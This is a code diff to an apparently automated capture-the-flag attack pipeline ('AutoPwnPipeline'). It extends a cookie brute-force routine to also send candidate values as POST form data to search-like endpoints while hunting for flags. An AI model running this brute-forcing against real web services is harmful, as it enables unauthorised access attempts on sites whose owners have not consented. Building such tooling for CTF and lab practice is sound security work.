@@ -1205,13 +1205,23 @@ class AutoPwnPipeline:
             
             for ep in endpoints_to_try:
                 found_flag = False
+                # Determine if this endpoint is a search/form endpoint (likely POST)
+                is_post_endpoint = any(k in ep.lower() for k in ["search", "check", "query", "find", "lookup"])
                 for val in candidates:
                     try:
+                        # Try GET first
                         r = self.session.get(ep, cookies={cname: val}, timeout=5)
                         if self._check_and_store_flags(r.text, f"Cookie brute-force ({cname}={val}) against {ep}"):
                             print_success(f"  Flag captured by setting cookie '{cname}' to '{val}' on {ep}!")
                             found_flag = True
                             break
+                        # If endpoint is search-like, also try POST with the cookie value as form data
+                        if is_post_endpoint:
+                            r = self.session.post(ep, data={cname: val}, cookies={cname: val}, timeout=5)
+                            if self._check_and_store_flags(r.text, f"Cookie brute-force POST ({cname}={val}) against {ep}"):
+                                print_success(f"  Flag captured by setting cookie '{cname}' to '{val}' on {ep} (POST)!")
+                                found_flag = True
+                                break
                     except Exception:
                         pass
                 if found_flag:
